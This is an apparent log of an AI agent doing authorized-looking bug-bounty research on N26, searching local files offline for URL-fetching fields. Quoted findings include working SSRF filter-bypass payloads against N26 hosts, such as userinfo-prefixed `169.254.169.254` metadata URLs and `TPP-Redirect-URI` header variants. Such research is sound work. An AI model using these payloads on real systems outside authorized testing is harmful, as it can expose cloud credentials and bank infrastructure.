@@ -70702,3 +70702,871 @@ My first leg returned `404` where the knowledge base predicted `403`. I treated 
 No internal address was dereferenced, no credentials used, ~1 rps, GET-only. Records written and read back to `probe-results.md`, `knowledge/index.md` (5 new entries), `reports/hypotheses-bigpickle.txt`, and `leads/lead-bigpickle.md`.
 
 **One thing needs you:** the commit failed (`git config user.email/user.name` unset). I left git config alone rather than guessing your identity — want me to commit these four records, and with which identity?
+===== ANALYST bigpickle 2026-10-05 06:16:20 UTC =====
+[0m
+> build · big-pickle
+[0m
+[0m$ [0mpwd && ls -la
+/home/runner/work/n26-hunt/n26-hunt
+total 1088
+drwxr-xr-x 12 runner runner   4096 Oct  5 06:10 .
+drwxr-xr-x  3 runner runner   4096 Oct  5 06:09 ..
+drwxr-xr-x  7 runner runner   4096 Oct  5 06:10 .git
+drwxr-xr-x  3 runner runner   4096 Oct  5 06:09 .github
+-rw-r--r--  1 runner runner   1844 Oct  5 06:09 README.md
+-rw-r--r--  1 runner runner     32 Oct  5 06:10 analyst-out.txt
+-rw-r--r--  1 runner runner 496710 Oct  5 06:10 analyst-prompt.txt
+-rw-r--r--  1 runner runner 492840 Oct  5 06:10 ctx.txt
+drwxr-xr-x  2 runner runner   4096 Oct  5 06:09 inventory
+drwxr-xr-x  2 runner runner   4096 Oct  5 06:09 knowledge
+drwxr-xr-x  2 runner runner   4096 Oct  5 06:09 leads
+-rw-r--r--  1 runner runner  24412 Oct  5 06:09 probe-results.md
+drwxr-xr-x  2 runner runner   4096 Oct  5 06:09 recon-notes
+drwxr-xr-x  2 runner runner   4096 Oct  5 06:09 reports
+drwxr-xr-x  2 runner runner   4096 Oct  5 06:09 reposcan-raw
+-rw-r--r--  1 runner runner   3283 Oct  5 06:09 scope.yml
+drwxr-xr-x  2 runner runner   4096 Oct  5 06:09 scripts
+-rw-r--r--  1 runner runner     33 Oct  5 06:09 state_bigpickle.json
+-rw-r--r--  1 runner runner     33 Oct  5 06:09 state_laguna.json
+-rw-r--r--  1 runner runner     33 Oct  5 06:09 state_ling3.json
+-rw-r--r--  1 runner runner     33 Oct  5 06:09 state_longcat.json
+-rw-r--r--  1 runner runner     33 Oct  5 06:09 state_mimo.json
+-rw-r--r--  1 runner runner     33 Oct  5 06:09 state_nemotron3.json
+drwxr-xr-x  2 runner runner  12288 Oct  5 06:09 triage
+[0m
+[0m$ [0mls -la knowledge/ 2>/dev/null | head -50; echo "---LEADS---"; ls -la art/ leads/ 2>/dev/null | head -40
+total 284
+drwxr-xr-x  2 runner runner   4096 Oct  5 06:09 .
+drwxr-xr-x 12 runner runner   4096 Oct  5 06:10 ..
+-rw-r--r--  1 runner runner 281801 Oct  5 06:09 index.md
+---LEADS---
+leads/:
+total 3532
+drwxr-xr-x  2 runner runner    4096 Oct  5 06:09 .
+drwxr-xr-x 12 runner runner    4096 Oct  5 06:10 ..
+-rw-r--r--  1 runner runner 1438200 Oct  5 06:09 lead-bigpickle.md
+-rw-r--r--  1 runner runner   10098 Oct  5 06:09 lead-laguna.md
+-rw-r--r--  1 runner runner    9900 Oct  5 06:09 lead-ling3.md
+-rw-r--r--  1 runner runner   10296 Oct  5 06:09 lead-longcat.md
+-rw-r--r--  1 runner runner      18 Oct  5 06:09 lead-mimo.md
+-rw-r--r--  1 runner runner 2056424 Oct  5 06:09 lead-nemotron3.md
+-rw-r--r--  1 runner runner    6911 Oct  5 06:09 reposcan-n26-manual.md
+-rw-r--r--  1 runner runner   56875 Oct  5 06:09 reposcan-n26.md
+[0m
+## Objective
+- Continue the N26 bug-bounty investigation in `{"phase":"POC","target":"api"}` and produce the required eight-step, structured-only analysis.
+- Lead with the newly proven AWB internal-address filter bypass and determine offline whether any N26 sink dereferences attacker-controlled URLs.
+
+## Important Details
+- Scope: N26-owned infrastructure, APIs, banking/payment/auth services, mobile/web apps, and domains only.
+- Final response must contain only `[DELTA]`, `[PRIORITY]`, `[HYP]`, `[PARKED]`, `[FINAL]`, exactly one `[NEXT]`, `[LEARN]`, and `[RISK]` blocks in the requested schemas.
+- Live testing is passive-first: only GET/HEAD/OPTIONS, ≤1 rps, no auth bypass, mutations, customer data, internal-address dereferencing, DoS, or scope expansion.
+- Facts and hypotheses must remain separate; every finding needs exact controls and verification steps. Hash any discovered secret.
+- Latest correction supersedes older wording: the AWB filter is **request-scoped**, not “query-string-scoped”; path/query literal filtering exists.
+- Proven AWB bypass uses RFC 3986 userinfo before an internal literal, e.g. `http://user@169.254.169.254/`; controls without userinfo remain blocked.
+- Current priority: `ALB_USERINFO_SSRF_FILTER_BYPASS` confidence 78, `AWB shared edge` priority 9.1. It is a standalone MEDIUM filter-coverage defect; SSRF impact becomes HIGH only with a dereferencing sink.
+- Prior hypotheses: `ALB_BLOCKLIST_CHANNEL_GAP` 66 is reframed as one instance of broader filter-channel gaps; `XSA_PROBE` 44 and `API_WILDCARD_BOLA_SURFACE` 42 remain AUTH_HELPED.
+
+## Work State
+### Completed
+- Proved the userinfo bypass across `xs2a.tech26.de`, `api.tech26.de`, and `app.n26.com` using 8+ GET-only legs and controls.
+- Confirmed bypasses include internal IPv4 literals with userinfo, ports, metadata hostnames, scheme-relative/bare forms, and null-byte variants; controls such as `http://169.254.169.254/x@evil.com/` remain blocked.
+- Established ALB-versus-application response controls: blocked forms return `403|118` with `server: awselb/2.0`; bypasses reach app-layer `401` on `istio-envoy`/`envoy`.
+- Corrected `app.n26.com/graphql`: no WAF; N26 Express returns invariant `403|43561`, and anonymous POST is not routed before GraphQL parsing.
+- Discharged `/login?redirect=` open redirect using bundle source: module `12273` in `1535.5a20cb49.js:155006` collapses off-origin continuations to `https://app.n26.com`.
+- Corrected API gating: fabricated `/api/accounts/1/zzqnotreal` returns the same `401|211` as live paths; 401 indicates wildcard-pattern membership, not resource existence.
+- Corrected `beta-api.tech26.de` and `sapi.tech26.de`: they expose the same GET-scoped `/api/*` gate as `api.tech26.de`.
+- Closed old Statsig route premise: `/v1/sdk_exception` now returns `403|19B "RBAC: access denied"`.
+- Verified `xs2a.tech26.de` sends a TLS CertificateRequest with an empty CA list, making mTLS advertised but optional.
+- Corrected tooling defects: phantom bundle 404s were prober artifacts; known-good bundles return HTTP 200 via direct curl.
+
+### Active
+- Perform an offline sink inventory across local corpora and downloaded bundles for `redirect_uri`, `TPP-Redirect-URI`, `returnUrl`, `webhook`, `callback`, and equivalent URL-fetch fields.
+- Trace any match to a concrete backend/network-fetch sink; do not dereference any internal address.
+- Reassess whether the proven filter bypass is standalone MEDIUM or chains to SSRF/cloud metadata.
+- Ranked hypothesis remains `ALB_USERINFO_SSRF_FILTER_BYPASS`; credentialed BOLA, MFA, and post-consent tests are secondary.
+
+### Blocked
+- Downstream SSRF impact is unknown until an attacker-controlled URL reaches a dereferencing sink.
+- Post-consent `TPP-Redirect-URI` validation needs a sandbox PSU/client and registered consent flow.
+- BOLA testing needs two valid account tokens; MFA/SCA redirect testing needs a provisioned test account and MFA polling session.
+- `triage/prober` is unreliable: it reports phantom 404s and host-interpolation errors such as `ERR <urlopen error [Errno -2] Name or service not known>`.
+- Triage feeder intake remains empty/errored; direct curl and offline evidence are required.
+
+## Next Move
+1. Run the passive sink inventory over `ctx.txt`, `knowledge/`, the `n26/psd2-tpp-docs` prose, and verified app bundles; record exact file/line and URL-fetch sink if found.
+2. If no sink is found, retain the bounded standalone filter-coverage finding and keep sandbox redirect and two-account BOLA requests AUTH_HELPED.
+
+## Relevant Files
+- `scope.yml`: authoritative eligible-asset scope.
+- `inventory/n26.md`: N26 asset inventory and historical observations.
+- `probe-results.md`: recorded probes, but timestamps/statuses require direct-curl validation because the prober is defective.
+- `ctx.txt`: primary offline search corpus.
+- `knowledge/`: accumulated findings and corrections.
+- `art/lead_nemotron3.txt`: rank-85 CBPII `TPP-Redirect-URI`/metadata lead.
+- `art/lead_bigpickle.txt`: original ALB channel-gap hypothesis.
+- `hypotheses-nemotron3.txt`: Nemotron hypothesis output.
+- `hypotheses-bigpickle.txt`: Bigpickle hypothesis output.
+- `triage/`: feeder artifacts; many runs are empty or errored.
+- `n26/psd2-tpp-docs/doc/sandbox.md`: documents sandbox redirect/header flow.
+- `n26/psd2-tpp-docs/doc/redirect/dedicated-aisp.md`: production `TPP-Redirect-*` semantics.
+- `n26/psd2-tpp-docs/doc/decoupled/dedicated-cbpii.md`: CBPII consent subtree and redirect behavior.
+- `n26/psd2-tpp-docs/doc/fallback-aisp.md`: fallback AIS routes and control semantics.
+- `n26/psd2-tpp-docs/doc/fallback-pisp.md`: fallback PIS routes and control semantics.
+- `https://app.n26.com/build/js/client.ae5f81a2.js`: verified HTTP 200, 1466288B, md5 `0886c4d3eeb57d56a3939be6a7037e80`.
+- `https://app.n26.com/build/js/banking-features-auth-biometric-LoginPage.6fd49c7e.js`: verified HTTP 200, 221646B, md5 `f2077cc831c8e4f9f82eb9ae87605c04`.
+Continue if you have next steps, or stop and ask for clarification if you are unsure how to proceed.
+[0m$ [0mcd /home/runner/work/n26-hunt/n26-hunt && for f in ctx.txt knowledge/index.md leads/lead-bigpickle.md leads/lead-nemotron3.md leads/reposcan-n26.md leads/reposcan-n26-manual.md probe-results.md; do printf '%-34s %s\n' "$f" "$(rg -c -i -e 'redirect_uri|TPP-Redirect-URI|returnUrl|webhook|callback' "$f" 2>/dev/null || echo 0)"; done
+ctx.txt                            0
+knowledge/index.md                 0
+leads/lead-bigpickle.md            0
+leads/lead-nemotron3.md            0
+leads/reposcan-n26.md              0
+leads/reposcan-n26-manual.md       0
+probe-results.md                   0
+[0m
+[0m$ [0mcd /home/runner/work/n26-hunt/n26-hunt && ls -la reports/ recon-notes/ inventory/ scripts/ | head -60
+inventory/:
+total 196
+drwxr-xr-x  2 runner runner   4096 Oct  5 06:09 .
+drwxr-xr-x 12 runner runner   4096 Oct  5 06:10 ..
+-rw-r--r--  1 runner runner 190494 Oct  5 06:09 n26.md
+
+recon-notes/:
+total 12
+drwxr-xr-x  2 runner runner 4096 Oct  5 06:09 .
+drwxr-xr-x 12 runner runner 4096 Oct  5 06:10 ..
+-rw-r--r--  1 runner runner  809 Oct  5 06:09 DEDICATED-DEEP.md
+
+reports/:
+total 9468
+drwxr-xr-x  2 runner runner    4096 Oct  5 06:09 .
+drwxr-xr-x 12 runner runner    4096 Oct  5 06:10 ..
+-rw-r--r--  1 runner runner 6102494 Oct  5 06:09 analyst-bigpickle.log
+-rw-r--r--  1 runner runner   42966 Oct  5 06:09 analyst-laguna.log
+-rw-r--r--  1 runner runner   42768 Oct  5 06:09 analyst-ling3.log
+-rw-r--r--  1 runner runner   43164 Oct  5 06:09 analyst-longcat.log
+-rw-r--r--  1 runner runner 2885986 Oct  5 06:09 analyst-nemotron3.log
+-rw-r--r--  1 runner runner   15520 Oct  5 06:09 hypotheses-bigpickle.txt
+-rw-r--r--  1 runner runner      51 Oct  5 06:09 hypotheses-laguna.txt
+-rw-r--r--  1 runner runner      50 Oct  5 06:09 hypotheses-ling3.txt
+-rw-r--r--  1 runner runner      52 Oct  5 06:09 hypotheses-longcat.txt
+-rw-r--r--  1 runner runner   11121 Oct  5 06:09 hypotheses-nemotron3.txt
+-rw-r--r--  1 runner runner  733821 Oct  5 06:09 hypotheses.md
+-rw-r--r--  1 runner runner    4596 Oct  5 06:09 reposcan-findings.md
+-rw-r--r--  1 runner runner    1529 Oct  5 06:09 valid-bugs.md
+
+scripts/:
+total 28
+drwxr-xr-x  2 runner runner  4096 Oct  5 06:09 .
+drwxr-xr-x 12 runner runner  4096 Oct  5 06:10 ..
+-rw-r--r--  1 runner runner 16987 Oct  5 06:09 sync-issues.py
+[0m
+[0m$ [0mcd /home/runner/work/n26-hunt/n26-hunt && echo "--sanity--" && rg -c -i 'n26' ctx.txt; echo "--redirect variants--"; rg -c -i 'redirect' ctx.txt knowledge/index.md leads/*.md probe-results.md reports/valid-bugs.md reports/reposcan-findings.md 2>/dev/null; echo "--escaped forms--"; rg -c -i 'redirect\\u005f|Redirect-URI|redirectUrl|redirect_url|uri' ctx.txt
+--sanity--
+/bin/bash: line 1: rg: command not found
+/bin/bash: line 1: rg: command not found
+--redirect variants--
+--escaped forms--
+[0m
+[0m$ [0mcd /home/runner/work/n26-hunt/n26-hunt && echo "--sink-ish terms across repo--"; for t in 'fetch\(' 'axios' 'requests\.get' 'urlopen' 'curl ' 'httpClient' 'HttpClient' 'RestTemplate' 'WebClient' 'callbackUrl' 'notificationUrl' 'imageUrl' 'logoUrl' 'avatarUrl' 'pdfUrl' 'downloadUrl' 'documentUrl'; do printf '%-18s ctx=%s inv=%s kb=%s\n' "$t" "$(rg -c -i "$t" ctx.txt 2>/dev/null||echo 0)" "$(rg -c -i "$t" inventory/n26.md 2>/dev/null||echo 0)" "$(rg -c -i "$t" knowledge/index.md 2>/dev/null||echo 0)"; done
+--sink-ish terms across repo--
+fetch\(            ctx=0 inv=0 kb=0
+axios              ctx=0 inv=0 kb=0
+requests\.get      ctx=0 inv=0 kb=0
+urlopen            ctx=0 inv=0 kb=0
+curl               ctx=0 inv=0 kb=0
+httpClient         ctx=0 inv=0 kb=0
+HttpClient         ctx=0 inv=0 kb=0
+RestTemplate       ctx=0 inv=0 kb=0
+WebClient          ctx=0 inv=0 kb=0
+callbackUrl        ctx=0 inv=0 kb=0
+notificationUrl    ctx=0 inv=0 kb=0
+imageUrl           ctx=0 inv=0 kb=0
+logoUrl            ctx=0 inv=0 kb=0
+avatarUrl          ctx=0 inv=0 kb=0
+pdfUrl             ctx=0 inv=0 kb=0
+downloadUrl        ctx=0 inv=0 kb=0
+documentUrl        ctx=0 inv=0 kb=0
+[0m
+`rg` is absent, so every zero above was a false negative. Redoing with `grep`.
+[0m$ [0mcd /home/runner/work/n26-hunt/n26-hunt && for f in ctx.txt knowledge/index.md inventory/n26.md probe-results.md leads/lead-bigpickle.md leads/lead-nemotron3.md leads/reposcan-n26.md reports/hypotheses.md; do printf '%-32s sinkterms=%-7s redirect=%-7s webhook=%-6s callback=%s\n' "$f" "$(grep -Eic 'redirect_uri|redirectUrl|returnUrl|webhook|callback[Uu]rl|notificationUrl' "$f" 2>/dev/null)" "$(grep -Eic 'redirect' "$f")" "$(grep -Eic 'webhook' "$f")" "$(grep -Eic 'callback' "$f")"; done
+ctx.txt                          sinkterms=64      redirect=269     webhook=3      callback=8
+knowledge/index.md               sinkterms=36      redirect=125     webhook=0      callback=1
+inventory/n26.md                 sinkterms=17      redirect=114     webhook=0      callback=6
+probe-results.md                 sinkterms=1       redirect=9       webhook=0      callback=6
+leads/lead-bigpickle.md          sinkterms=176     redirect=447     webhook=5      callback=15
+leads/lead-nemotron3.md          sinkterms=351     redirect=942     webhook=5      callback=15
+leads/reposcan-n26.md            sinkterms=6       redirect=6       webhook=0      callback=2
+reports/hypotheses.md            sinkterms=72      redirect=440     webhook=0      callback=1
+[0m
+[0m$ [0mcd /home/runner/work/n26-hunt/n26-hunt && echo "=== WEBHOOK (all corpora) ===" && grep -Ein -e 'webhook' ctx.txt knowledge/index.md inventory/n26.md leads/*.md reports/hypotheses.md 2>/dev/null | cut -c1-320
+=== WEBHOOK (all corpora) ===
+ctx.txt:1076:evidence_needed: A downstream N26 sink that dereferences an attacker-supplied URL (redirect_uri / TPP-Redirect-URI / webhook) to establish SSRF impact beyond filter coverage. Filter bypass itself is already proven and needs no further evidence.
+ctx.txt:1077:verify_steps: PASSIVE confirmed, GET only, ~1 rps, 8+ bypass legs + controls across 3 hosts. STOP at ALB-vs-app response class; do NOT dereference any internal address. For impact, requires AUTH_HELPED or a passive sink inventory on redirect/webhook fields.
+ctx.txt:1082:[NEXT] SELF: passive sink inventory — grep already-collected corpus/bundles for URL-dereferencing fields (redirect_uri, TPP-Redirect-URI, returnUrl, webhook, callback) to find whether any N26 backend fetches an attacker-supplied URL. This is offline work against local artifacts and does not need credenti
+leads/lead-bigpickle.md:1976:impact: `sk_/rk_` → full Stripe-account BOLA on N26 (customers/PII, charges, refunds, webhooks) — HIGH if listed; currently unverifiable.
+leads/lead-bigpickle.md:2134:impact: `sk_/rk_` → full Stripe-account BOLA on N26 (customers/PII, charges, refunds, webhooks) — HIGH if listed; currently unverifiable.
+leads/lead-bigpickle.md:8456:evidence_needed: A downstream N26 sink that dereferences an attacker-supplied URL (redirect_uri / TPP-Redirect-URI / webhook) to establish SSRF impact beyond filter coverage. Filter bypass itself is already proven and needs no further evidence.
+leads/lead-bigpickle.md:8457:verify_steps: PASSIVE confirmed, GET only, ~1 rps, 8+ bypass legs + controls across 3 hosts. STOP at ALB-vs-app response class; do NOT dereference any internal address. For impact, requires AUTH_HELPED or a passive sink inventory on redirect/webhook fields.
+leads/lead-bigpickle.md:8462:[NEXT] SELF: passive sink inventory — grep already-collected corpus/bundles for URL-dereferencing fields (redirect_uri, TPP-Redirect-URI, returnUrl, webhook, callback) to find whether any N26 backend fetches an attacker-supplied URL. This is offline work against local artifacts and does n
+leads/lead-nemotron3.md:156:verify_steps: Enumerate endpoints via GET /health, /ready, /metrics, /api, /v1; test any callback/redirect/webhook parameters with http://169.254.169.254/latest/meta-data/  
+leads/lead-nemotron3.md:237:verify_steps: Enumerate endpoints via GET /health, /ready, /metrics, /api, /v1; test any callback/redirect/webhook parameters with http://169.254.169.254/latest/meta-data/
+leads/lead-nemotron3.md:370:verify_steps: Enumerate endpoints via GET /health, /ready, /metrics, /api, /v1; test any callback/redirect/webhook parameters with http://169.254.169.254/latest/meta-data/
+leads/lead-nemotron3.md:420:verify_steps: Enumerate endpoints via GET /health, /ready, /metrics, /api, /v1; test any callback/redirect/webhook parameters with http://169.254.169.254/latest/meta-data/
+leads/lead-nemotron3.md:469:verify_steps: Enumerate endpoints via GET /health, /ready, /metrics, /api, /v1; test any callback/redirect/webhook parameters with http://169.254.169.254/latest/meta-data/
+[0m
+[0m$ [0mcd /home/runner/work/n26-hunt/n26-hunt && echo "=== callbackUrl / notificationUrl / returnUrl in ctx+kb+inv ===" && grep -Ein -e 'callbackUrl' -e 'notificationUrl' -e 'returnUrl' -e 'return_url' ctx.txt knowledge/index.md inventory/n26.md 2>/dev/null | cut -c1-300
+=== callbackUrl / notificationUrl / returnUrl in ctx+kb+inv ===
+ctx.txt:1082:[NEXT] SELF: passive sink inventory — grep already-collected corpus/bundles for URL-dereferencing fields (redirect_uri, TPP-Redirect-URI, returnUrl, webhook, callback) to find whether any N26 backend fetches an attacker-supplied URL. This is offline work against local artifacts and do
+[0m
+[0m$ [0mcd /home/runner/work/n26-hunt/n26-hunt && echo "=== redirect_uri / TPP-Redirect-URI in ctx+kb+inv (dedup lines) ===" && grep -Eih -o '.\{0,90\}\(redirect_uri\|TPP-Redirect-URI\|tpp_redirect_uri\).\{0,90\}' ctx.txt knowledge/index.md inventory/n26.md 2>/dev/null | sort -u | cut -c1-260
+=== redirect_uri / TPP-Redirect-URI in ctx+kb+inv (dedup lines) ===
+[0m
+[0m$ [0mcd /home/runner/work/n26-hunt/n26-hunt && echo "redirect_uri:" && grep -Ec 'redirect_uri' ctx.txt knowledge/index.md inventory/n26.md leads/lead-bigpickle.md leads/lead-nemotron3.md; echo "TPP-Redirect:" && grep -Ec 'TPP-Redirect' ctx.txt knowledge/index.md inventory/n26.md leads/lead-bigpickle.md leads/lead-nemotron3.md; echo "tpp_redirect:" && grep -Eic 'tpp_redirect' ctx.txt knowledge/index.md inventory/n26.md leads/lead-nemotron3.md
+redirect_uri:
+ctx.txt:48
+knowledge/index.md:27
+inventory/n26.md:16
+leads/lead-bigpickle.md:124
+leads/lead-nemotron3.md:329
+TPP-Redirect:
+ctx.txt:63
+knowledge/index.md:17
+inventory/n26.md:35
+leads/lead-bigpickle.md:86
+leads/lead-nemotron3.md:185
+tpp_redirect:
+ctx.txt:0
+knowledge/index.md:0
+inventory/n26.md:0
+leads/lead-nemotron3.md:0
+[0m
+[0m$ [0mcd /home/runner/work/n26-hunt/n26-hunt && python3 - <<'PY'
+import re,io
+files=["knowledge/index.md","inventory/n26.md"]
+pat=re.compile(r'redirect_uri|TPP-Redirect|tpp.redirect|returnUrl',re.I)
+seen=set()
+for f in files:
+    for i,line in enumerate(open(f,encoding='utf-8',errors='replace'),1):
+        for m in pat.finditer(line):
+            s=max(0,m.start()-140); e=min(len(line),m.end()+140)
+            frag=line[s:e].strip()
+            key=re.sub(r'\s+',' ',frag)[:150]
+            if key in seen: continue
+            seen.add(key)
+            print(f"{f}:{i}: ...{re.sub(chr(92)+'s+',' ',frag)}...")
+print("UNIQUE FRAGMENTS:",len(seen))
+PY
+knowledge/index.md:660: ...- 2026-09-26 ACCEPTED OATH @ xs2a.tech26.de: the authorize endpoint performs NO pre-authentication value validation of client_id, scope or redirect_uri. The gate requires BOTH client_id and scope to be present (either missing -> 404 len=0) and then demands authentication (401 len=0) regardl...
+knowledge/index.md:661: ...- 2026-09-26 ACCEPTED MISCONFIG @ xs2a.tech26.de: the redirect_uri loopback/private-host blocklist is enforced at the AWS ALB (`server: awselb/2.0`, 118-byte nginx body, no istio-envoy headers), not by the...
+knowledge/index.md:662: ...only presence, before it is ever attributed to an *invalid* value. It was caught this cycle only because a deliberately malformed control (`redirect_uri=http://0x7f.1x/`) happened to return 401 and exposed the contradiction....
+knowledge/index.md:669: ...- 2026-09-27 ACCEPTED OATH @ xs2a.tech26.de: the redirect_uri blocklist **requires a `scheme://` literal to engage and performs no URI parsing whatsoever**. Proof that it is a non-parsing substring mat...
+knowledge/index.md:670: ...ess: a control discovered on one tier must be re-run on every sibling tier before the control is described as a program-level property. The redirect_uri blocklist was mapped on the live authorize plane over three cycles and I recorded it as a property of the host; testing `/sandbox/oauth2/au...
+knowledge/index.md:685: ...- 2026-09-27 ACCEPTED MISCONFIG @ xs2a.tech26.de: the redirect_uri loopback/private-host blocklist is enforced at the AWS ALB (`server: awselb/2.0`, 118-byte nginx body, no istio-envoy headers), not by the...
+knowledge/index.md:686: ...- 2026-09-27 ACCEPTED OATH @ xs2a.tech26.de: the authorize endpoint performs NO pre-authentication value validation of client_id, scope or redirect_uri. The gate requires BOTH client_id and scope to be present (either missing → 404 len=0) and then demands authentication (401 len=0) regardle...
+knowledge/index.md:688: ...- 2026-09-28 ACCEPTED MISCONFIG @ xs2a.tech26.de: the redirect_uri loopback/private-host blocklist is enforced at the AWS ALB (`server: awselb/2.0`, 118-byte nginx body, no istio-envoy headers), not by the...
+knowledge/index.md:689: ...- 2026-09-28 ACCEPTED OATH @ xs2a.tech26.de: the authorize endpoint performs NO pre-authentication value validation of client_id, scope or redirect_uri. The gate requires BOTH client_id and scope to be present (either missing → 404 len=0) and then demands authentication (401 len=0) regardle...
+knowledge/index.md:709: ...- 2026-09-28 ACCEPTED OATH @ xs2a.tech26.de: redirect_uri blocklist is ALB-level substring filter requiring `scheme://` literal; scheme-relative URIs bypass to application layer (istio-envoy 401) w...
+knowledge/index.md:725: ...- 2026-09-29 ACCEPTED OATH @ xs2a.tech26.de: redirect_uri blocklist is ALB-level substring filter requiring `scheme://` literal; scheme-relative URIs bypass to application layer (istio-envoy 401) w...
+knowledge/index.md:751: ...- 2026-09-29 ACCEPTED OTHER @ xs2a.tech26.de: the 09-27/09-28 "redirect_uri blocklist" finding is **retracted as an OATH item** and the OATH severity claim is withdrawn. The 09-27 evidence was real but I never scope...
+knowledge/index.md:751: ...) while `127.0.0.1` in the **path** passes (404 and 401 istio-envoy) proves it is a generic query-string blocklist on the shared ELB, not a redirect_uri control. There was never an OAuth control to bypass, so there is no authorization-code-theft finding. The 09-28 sub-finding (AS performs no...
+knowledge/index.md:751: ...here was never an OAuth control to bypass, so there is no authorization-code-theft finding. The 09-28 sub-finding (AS performs no pre-auth `redirect_uri` value validation) still stands on its own measurements, but it is a missing-feature observation, not a bypass....
+knowledge/index.md:765: ...- 2026-09-29 ACCEPTED SSRF @ xs2a.tech26.de/oauth2/authorize and /sandbox/oauth2/authorize: scheme-relative redirect_uri bypasses ALB substring blocklist (requires scheme://) reaching application layer; behavior confirmed identical across production and sandbo...
+knowledge/index.md:768: ...- 2026-09-29 REJECTED OATH @ xs2a.tech26.de: redirect_uri blocklist is generic query-string substring filter (not scoped to redirect_uri field semantics) — OAuth control bypass not demonstrated....
+knowledge/index.md:770: ...- 2026-09-29 REJECTED OTHER @ xs2a.tech26.de /oauth2/authorize: my 09-29 claim that the scheme-relative redirect_uri...
+knowledge/index.md:778: ...- 2026-09-30 ACCEPTED OATH @ xs2a.tech26.de: redirect_uri blocklist is ALB-level substring filter requiring `scheme://` literal; scheme-relative URIs bypass to application layer (istio-envoy 401) w...
+knowledge/index.md:791: ...info/ports/scheme-relative forms) produced many reproducible bypasses of a generic ALB substring blocklist but did not demonstrate an OAuth redirect_uri control bypass (filter is field-agnostic and not scoped to redirect_uri semantics). The OAuth control bypass was retracted....
+knowledge/index.md:791: ...a generic ALB substring blocklist but did not demonstrate an OAuth redirect_uri control bypass (filter is field-agnostic and not scoped to redirect_uri semantics). The OAuth control bypass was retracted....
+knowledge/index.md:802: ...- 2026-10-01 ACCEPTED OATH @ xs2a.tech26.de: redirect_uri blocklist is ALB-level substring filter requiring `scheme://` literal; scheme-relative URIs bypass to application layer (istio-envoy 401) w...
+knowledge/index.md:813: ...|118` awselb/2.0 (field-agnostic, confirmed 09-29), while header `X-Foo: https://127.0.0.1@evil.example/` → `401|0` istio-envoy and header `TPP-Redirect-URI: http://169.254.169.254/latest/meta-data/` → `401|0` (headers not inspected). This **supersedes** the 09-29 retraction: that entry was...
+knowledge/index.md:813: ...x.md` and `doc/redirect/dedicated-aisp.md` (both never opened before this cycle) document a production redirect destination carried in the `TPP-Redirect-URI` **header**, with `TPP-State` echoed to it and `error=access_denied` on failure. Generalised rule, and the fourth instance of this prog...
+knowledge/index.md:816: ...tch: query `foo=<blocked>` → `403|118` `awselb/2.0`; header `X-Foo: <blocked>` → `401|0` istio-envoy (`xs2a`) and `401|211` envoy (`api`); `TPP-Redirect-URI: http://169.254.169.254/latest/meta-data/` → `401|0`; `X-Forwarded-Host: 127.0.0.1@evil.example` → `401|0`. This **supersedes** the 09-...
+knowledge/index.md:816: ...27.0.0.1@evil.example` → `401|0`. This **supersedes** the 09-29 retraction: that entry was right that no control was bypassed in the query `redirect_uri` and wrong to conclude no redirect control exists, because `doc/sandbox.md` and `doc/redirect/dedicated-aisp.md` (both unopened until this...
+knowledge/index.md:817: ...- 2026-10-01 ACCEPTED OTHER @ `xs2a.tech26.de`: the AS performs **no** pre-auth discrimination of `TPP-Redirect-*`. Four legs — headers absent, `Preferred` only, `URI: not-a-url`, `URI: 169.254.169.254` — all returned `401|0` with empty body, md5 `d41...
+knowledge/index.md:820: ...g blocklist is **query-string-scoped**, not request-scoped, and the field it inspects is not the field the production redirect flow uses — `TPP-Redirect-URI` header bypasses ALB entirely...
+knowledge/index.md:823: ...- 2026-10-01 ACCEPTED OATH @ xs2a.tech26.de: AS performs **no** pre-auth discrimination of `TPP-Redirect-*` — four legs all byte-identical 401|0 md5 d41d8cd9...
+knowledge/index.md:841: ...- 2026-10-02 ACCEPTED OATH @ xs2a.tech26.de: redirect_uri blocklist is ALB-level substring filter requiring `scheme://` literal; scheme-relative URIs bypass to application layer (istio-envoy 401) w...
+knowledge/index.md:855: ...- 2026-10-02 ACCEPTED OATH @ xs2a.tech26.de: AS performs **no** pre-auth discrimination of `TPP-Redirect-*` — four legs all byte-identical 401|0 md5 d41d8cd9...
+knowledge/index.md:912: ...- 2026-10-03 ACCEPTED OATH @ xs2a.tech26.de: redirect_uri blocklist is ALB-level substring filter requiring `scheme://` literal; scheme-relative URIs bypass to application layer (istio-envoy 401) w...
+knowledge/index.md:926: ...- 2026-10-03 ACCEPTED OATH @ xs2a.tech26.de: AS performs **no** pre-auth discrimination of `TPP-Redirect-*` — four legs all byte-identical 401|0 md5 d41d8cd9...
+knowledge/index.md:956: ...is **parameter presence** (missing `client_id` and/or `scope` → 404 len=0; both present with any values → 401 len=0), not value validation. Redirect_uri blocklist is ALB-level substring filter requiring `scheme://` literal and is **query-string-scoped** (header `TPP-Redirect-URI` bypasses AL...
+knowledge/index.md:956: ...alue validation. Redirect_uri blocklist is ALB-level substring filter requiring `scheme://` literal and is **query-string-scoped** (header `TPP-Redirect-URI` bypasses ALB). Sandbox tier co-tenant on production host....
+knowledge/index.md:960: ...this cycle's 7-leg within-batch differential showed it is also (a) not parameter-specific — the token is blocked in `state` exactly as in `redirect_uri` — and (b) not channel-complete — the identical token is unfiltered in `TPP-Redirect-URI` and `X-Forwarded-Host`. The generalisable rule: *...
+knowledge/index.md:960: ...cific — the token is blocked in `state` exactly as in `redirect_uri` — and (b) not channel-complete — the identical token is unfiltered in `TPP-Redirect-URI` and `X-Forwarded-Host`. The generalisable rule: **a filter proved on one channel says nothing about a sibling channel, and a blocklist...
+knowledge/index.md:964: ...- 2026-10-04 ACCEPTED OATH @ xs2a.tech26.de: redirect_uri blocklist is ALB-level substring filter requiring `scheme://` literal; scheme-relative URIs bypass to application layer (istio-envoy 401) w...
+knowledge/index.md:978: ...- 2026-10-04 ACCEPTED OATH @ xs2a.tech26.de: AS performs **no** pre-auth discrimination of `TPP-Redirect-*` — four legs all byte-identical 401|0 md5 d41d8cd9...
+knowledge/index.md:988: ...4 ACCEPTED OATH @ xs2a.tech26.de/oauth2/authorize: ALB substring blocklist is query-string-scoped (requires scheme://), not request-scoped; TPP-Redirect-URI header bypasses ALB entirely to application layer (istio-envoy 401). Sandbox tier identical; AS performs no pre-auth discrimination of...
+knowledge/index.md:988: ...-URI header bypasses ALB entirely to application layer (istio-envoy 401). Sandbox tier identical; AS performs no pre-auth discrimination of TPP-Redirect-* headers....
